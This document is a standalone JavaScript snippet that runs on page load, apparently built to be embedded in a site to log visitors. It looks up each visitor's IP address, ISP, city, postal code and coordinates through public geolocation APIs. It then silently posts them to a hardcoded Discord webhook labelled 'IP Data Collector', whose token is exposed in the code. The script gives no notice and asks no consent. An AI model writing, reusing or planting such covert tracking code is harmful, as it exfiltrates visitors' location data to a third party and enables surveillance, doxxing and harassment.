(() => {
  const sendToDiscord = async (data) => {
    try {
      const embed = {
        title: "🌍 Complete IP Information",
        color: 0x3498db,
        fields: [
          { name: "IP Address", value: data.ip || "Unknown", inline: true },
          { name: "Network", value: data.network || "Unknown", inline: true },
          { name: "Version", value: data.version || "Unknown", inline: true },
          { name: "City", value: data.city || "Unknown", inline: true },
          {
            name: "Region",
            value: `${data.region} (${data.region_code})` || "Unknown",
            inline: true,
          },
          {
            name: "Country",
            value: `${data.country_name} (${data.country_code})`,
            inline: true,
          },
          {
            name: "Capital",
            value: data.country_capital || "Unknown",
            inline: true,
          },
          {
            name: "Continent",
            value: data.continent_code || "Unknown",
            inline: true,
          },
          {
            name: "Postal Code",
            value: data.postal || "Unknown",
            inline: true,
          },
          {
            name: "Coordinates",
            value: `${data.latitude}, ${data.longitude}` || "Unknown",
            inline: true,
          },
          {
            name: "Timezone",
            value: `${data.timezone} (UTC${data.utc_offset})` || "Unknown",
            inline: true,
          },
          {
            name: "Calling Code",
            value: data.country_calling_code || "Unknown",
            inline: true,
          },
          {
            name: "Currency",
            value: `${data.currency} (${data.currency_name})` || "Unknown",
            inline: true,
          },
          {
            name: "Languages",
            value: data.languages || "Unknown",
            inline: true,
          },
          {
            name: "Country Area",
            value: data.country_area ? `${data.country_area} km²` : "Unknown",
            inline: true,
          },
          {
            name: "Population",
            value: data.country_population?.toLocaleString() || "Unknown",
            inline: true,
          },
          { name: "ASN", value: data.asn || "Unknown", inline: true },
          { name: "Organization", value: data.org || "Unknown", inline: true },
          { name: "In EU", value: data.in_eu ? "Yes" : "No", inline: true },
          { name: "TLD", value: data.country_tld || "Unknown", inline: true },
        ],
        footer: { text: `Collected at ${new Date().toUTCString()}` },
      };

      await fetch(
        "https://discord.com/api/webhooks/1401997242511917086/duk9-WwJDKSCC111Sj2g16IvnwFCvQjNjlsVHfdE5suHDAGbOfQ0AVPoi8W8Pj-zZz__",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: "IP Data Collector",
            avatar_url: "https://i.imgur.com/ABC123.png",
            embeds: [embed],
          }),
        }
      );
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
  };

  fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((data) => sendToDiscord(data))
    .catch((error) => {
      console.error("Error fetching IP data:", error);
      fetch("https://ipwho.is/json/")
        .then((response) => response.json())
        .then((fallbackData) => sendToDiscord(fallbackData))
        .catch((fallbackError) =>
          console.error("Fallback IP service failed:", fallbackError)
        );
    });
})();
